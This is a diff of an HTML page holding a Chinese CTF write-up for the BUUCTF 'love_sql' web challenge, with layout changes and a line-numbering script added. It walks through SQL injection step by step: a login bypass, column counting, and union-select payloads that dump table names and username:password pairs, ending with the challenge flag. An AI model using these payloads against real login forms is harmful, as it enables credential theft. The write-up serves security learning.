@@ -1,139 +1,100 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh-CN" data-scheme="dark">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>[Web] love_sql | CTF WP</title>
-  <link rel="stylesheet" href="../../style.css">
-  <style>
-    .wp-content {
-      max-width: 900px;
-      margin: 0 auto;
-      background: var(--card-bg);
-      padding: 2.5rem;
-      border-radius: 16px;
-      border: 1px solid var(--border-color);
-    }
-    .wp-title {
-      font-size: 1.8rem;
-      margin-bottom: 1rem;
-      color: var(--text-primary);
-    }
-    .wp-meta {
-      color: var(--text-secondary);
-      margin-bottom: 2rem;
-      font-size: 0.95rem;
-      display: flex;
-      gap: 1rem;
-    }
-    .wp-section {
-      margin: 2rem 0;
-    }
-    .wp-section h2 {
-      font-size: 1.3rem;
-      margin-bottom: 0.8rem;
-      color: var(--text-primary);
-      border-left: 4px solid var(--accent);
-      padding-left: 0.8rem;
-    }
-    pre {
-      background: #1e1e1e;
-      color: #dcdcaa;
-      padding: 1rem;
-      border-radius: 8px;
-      overflow-x: auto;
-      margin: 1rem 0;
-    }
-    .back-home {
-      display: inline-block;
-      margin-bottom: 2rem;
-      color: var(--accent);
-      font-weight: 500;
-    }
-    .wp-img {
-      width: 100%;
-      border-radius: 8px;
-      margin: 1.2rem 0;
-      box-shadow: 0 0 12px rgba(0,0,0,0.1);
-    }
-  </style>
+  <link rel="stylesheet" href="../../../style.css">
 </head>
 <body>
-  <div class="container">
-    <main class="main full-width">
-      <div class="wp-content">
-        <a href="../../index.html" class="back-home">← 返回主页</a>
-        <h1 class="wp-title">[Web] love_sql</h1>
-        <div class="wp-meta">
-          <span>分类：Web SQL 注入</span>
-          <span>难度：简单</span>
-          <span>时间：2025-12-30</span>
-        </div>
 
-        <div class="wp-section">
-          <h2>0x01 题目环境</h2>
-          <p>打开页面是一个登录框，存在明显的 SQL 注入漏洞。</p>
-          <img src="picture/buulovesql0.png" class="wp-img" alt="题目界面">
-        </div>
-
-        <div class="wp-section">
-          <h2>0x02 测试注入点</h2>
-          <p>使用万能密码测试是否存在注入：</p>
-          <pre>admin' or 1=1#</pre>
-          <p>密码随意填写，登录成功，确认存在字符型 SQL 注入。</p>
-          <img src="picture/buulovesql1.png" class="wp-img" alt="测试注入点">
-        </div>
-
-        <div class="wp-section">
-          <h2>0x03 判断字段数</h2>
-          <pre>admin' order by 3#</pre>
-          <p>页面正常回显</p>
-          <pre>admin' order by 4#</pre>
-          <p>页面报错，说明字段数为 3。</p>
-          <img src="picture/buulovesql2.png" class="wp-img" alt="判断字段数">
-        </div>
-
-        <div class="wp-section">
-          <h2>0x04 查看回显位</h2>
-          <pre>1' union select 1,2,3#</pre>
-          <p>页面成功回显 2、3 位，可用于注入。</p>
-          <img src="picture/buulovesql3.png" class="wp-img" alt="查看回显位">
-        </div>
-
-        <div class="wp-section">
-          <h2>0x05 爆数据库名</h2>
-          <pre>1' union select 1,2,database()#</pre>
-          <p>成功得到当前数据库名：geek</p>
-          <img src="picture/buulovesql4.png" class="wp-img" alt="爆数据库">
-        </div>
-
-        <div class="wp-section">
-          <h2>0x06 爆表名</h2>
-          <pre>1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</pre>
-          <p>得到表名：geekuser, l0ve1ysq1</p>
-          <img src="picture/buulovesql5.png" class="wp-img" alt="爆表名">
-        </div>
-
-        <div class="wp-section">
-          <h2>0x07 爆字段名</h2>
-          <pre>1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'#</pre>
-          <p>得到字段，确认存在 username、password 等关键字段。</p>
-          <img src="picture/buulovesql6.png" class="wp-img" alt="爆字段">
-        </div>
-
-        <div class="wp-section">
-          <h2>0x08 获取 Flag</h2>
-          <pre>1' union select 1,2,group_concat(username,':',password) from l0ve1ysq1#</pre>
-          <p>页面返回大量数据，其中包含 flag。</p>
-          <img src="picture/buulovesql7.png" class="wp-img" alt="获取flag">
-        </div>
-
-        <div class="wp-section">
-          <h2>0x09 Flag</h2>
-          <pre>flag{6e33e763-803a-447c-ac6e-d70feb695d15}</pre>
-        </div>
-      </div>
-    </main>
+<div class="wp-content" data-category="web" data-competition="BUUCTF" data-challenge="love_sql" data-difficulty="easy" data-date="2025-12-30">
+  <a href="../../../index.html" class="back-home">← 返回主页</a>
+  <h1 class="wp-title">[Web] love_sql</h1>
+  <h4 class="sub-title">BUUCTF SQL注入入门题</h4>
+  <div class="wp-meta">
+    <span>分类：Web SQL 注入</span>
+    <span>难度：简单</span>
+    <span>时间：2025-12-30</span>
   </div>
+
+  <div class="wp-section">
+    <h2>0x01 题目环境</h2>
+    <p>打开页面是一个登录框，存在明显的 SQL 注入漏洞。</p>
+    <img src="picture/buulovesql0.png" class="wp-img" alt="题目界面">
+  </div>
+
+  <div class="wp-section">
+    <h2>0x02 测试注入点</h2>
+    <p>使用万能密码测试是否存在注入：</p>
+    <div class="ide"><pre>admin' or 1=1#</pre></div>
+    <p>密码随意填写，登录成功，确认存在字符型 SQL 注入。</p>
+    <img src="picture/buulovesql1.png" class="wp-img" alt="测试注入点">
+  </div>
+
+  <div class="wp-section">
+    <h2>0x03 判断字段数</h2>
+    <div class="ide"><pre>admin' order by 3#</pre></div>
+    <p>页面正常回显</p>
+    <div class="ide"><pre>admin' order by 4#</pre></div>
+    <p>页面报错，说明字段数为 3。</p>
+    <img src="picture/buulovesql2.png" class="wp-img" alt="判断字段数">
+  </div>
+
+  <div class="wp-section">
+    <h2>0x04 查看回显位</h2>
+    <div class="ide"><pre>1' union select 1,2,3#</pre></div>
+    <p>页面成功回显 2、3 位，可用于注入。</p>
+    <img src="picture/buulovesql3.png" class="wp-img" alt="查看回显位">
+  </div>
+
+  <div class="wp-section">
+    <h2>0x05 爆数据库名</h2>
+    <div class="ide"><pre>1' union select 1,2,database()#</pre></div>
+    <p>成功得到当前数据库名：geek</p>
+    <img src="picture/buulovesql4.png" class="wp-img" alt="爆数据库">
+  </div>
+
+  <div class="wp-section">
+    <h2>0x06 爆表名</h2>
+    <div class="ide"><pre>1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</pre></div>
+    <p>得到表名：geekuser, l0ve1ysq1</p>
+    <img src="picture/buulovesql5.png" class="wp-img" alt="爆表名">
+  </div>
+
+  <div class="wp-section">
+    <h2>0x07 爆字段名</h2>
+    <div class="ide"><pre>1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'#</pre></div>
+    <p>得到字段，确认存在 username、password 等关键字段。</p>
+    <img src="picture/buulovesql6.png" class="wp-img" alt="爆字段">
+  </div>
+
+  <div class="wp-section">
+    <h2>0x08 获取 Flag</h2>
+    <div class="ide"><pre>1' union select 1,2,group_concat(username,':',password) from l0ve1ysq1#</pre></div>
+    <p>页面返回大量数据，其中包含 flag。</p>
+    <img src="picture/buulovesql7.png" class="wp-img" alt="获取flag">
+  </div>
+
+  <div class="wp-section">
+    <h2>0x09 Flag</h2>
+    <div class="ide"><pre>flag{6e33e763-803a-447c-ac6e-d70feb695d15}</pre></div>
+  </div>
+</div>
+
+<script>
+document.querySelectorAll('.ide pre').forEach(pre => {
+  const lines = pre.textContent.split('\n')
+  pre.innerHTML = ''
+  lines.forEach((line, i) => {
+    const span = document.createElement('span')
+    span.className = 'line'
+    span.setAttribute('data-line', i + 1)
+    span.textContent = line
+    pre.appendChild(span)
+  })
+})
+</script>
+<script src="../../../wp-script.js"></script>
 </body>
 </html>
